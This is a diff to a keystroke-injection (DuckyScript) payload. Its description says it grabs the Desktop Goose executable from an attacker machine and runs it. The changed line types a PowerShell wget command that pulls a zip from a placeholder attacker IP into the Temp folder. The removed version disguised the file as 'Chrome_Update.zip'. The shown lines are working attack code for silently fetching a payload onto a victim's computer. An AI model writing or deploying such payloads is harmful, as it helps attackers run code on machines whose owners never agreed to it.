@@ -4,7 +4,7 @@ REM DESCRIPTION Grab the Desktop Goose executable from an attacker machine and r
 DELAY 500
 GUI r
 DELAY 500
-STRING powershell wget YOUR_IP:1337/Chrome_Update.zip -OutFile $ENV:Temp/Update.zip
+STRING powershell wget YOUR_IP/ZIP -OutFile $ENV:Temp/Update.zip
 ENTER
 DELAY 8000
 GUI r
